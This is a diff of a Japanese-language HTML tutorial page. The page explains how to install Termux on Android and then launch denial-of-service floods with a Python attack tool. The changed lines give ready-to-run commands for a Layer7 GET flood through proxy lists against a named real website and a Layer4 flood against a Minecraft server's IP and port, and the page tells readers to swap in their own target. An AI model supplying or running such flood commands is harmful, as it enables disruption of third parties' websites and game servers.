@@ -78,6 +78,7 @@
                     <div class="text_area mgb_20">
                         <p class="mchar">では早速TermuxというLinuxエミュレータをインストールします。下のURLを押すと自動でapkファイルがダウンロードされます。ダウンロードが終わりましたら起動してインストールしてください。</p>
                         <p class="mchar"><a href="https://f-droid.org/repo/com.termux_118.apk" >https://f-droid.org/repo/com.termux_118.apk</a></p>
+                        <b>※Android9以降の方は<a href="https://play.google.com/store/apps/details?id=com.termux">ここ</a>からどうぞ</b><br>
                     </div>
                     <div class="img_area mgb_20 img_extension extension_position_center">
                         <a href="./files/Screenshot_2022.07.03_20.27.41.634.png" class="imgbd img80 bd_n posi_c" data-fancybox="">
@@ -162,17 +163,14 @@
                     </div>
                     <div class="text_area mgb_20">
                         <p class="mchar">以下のコマンドをそのままコピペして使用せずに攻撃先に合わせ書き換えて下さい。あとで、痛い目見ますよ。</p>
-                        <p>Layer7の基本</p>
-                        <b>python3 start.py <種類> <攻撃先URL> <串のタイプ> <スレッド> <串リスト> <rpc> <継続時間></b><br>
+                        <h3>Layer7の基本</h3>
+                        <code>python3 start.py <種類> <攻撃先URL> <串のタイプ> <スレッド> <串リスト> <rpc> <継続時間></code><br>
                         <p>下のコマンドは攻撃先URLと継続時間を変えるだけでよろしい</p>
-                        <code>
-                            python3 start.py GET http://prkorea.com 1 200 proxy.txt 100 3600
-                        </code><br>
-                        <p>Layer4の基本</p>
-                        <b>python3 start.py <種類> <ip:port> <スレッド> <存続期間> <reflector file, (only use with Amplification></b><br><br>
+                        <code>python3 start.py GET http://prkorea.com 1 200 proxy.txt 100 3600</code><br><br>
+                        <h3>Layer4の基本</h3>
+                        <code>python3 start.py <種類> <ip:port> <スレッド> <存続期間> <reflector file, (only use with Amplification></code><br><br>
                         <p>Layer4でマイクラサーバを攻撃する場合</p>
-                        <b>python3 start.py MINECRAFT 11.45.1.4:810 2000 3600</b><br>
-                        <b></b><br>
+                        <code>python3 start.py MINECRAFT 11.45.1.4:810 2000 3600</code><br><br>
                         <big><b>詳しい内容はpython3 start.pyを入力して試して下さい。</b></big><br>
                         <br>
                         <big>
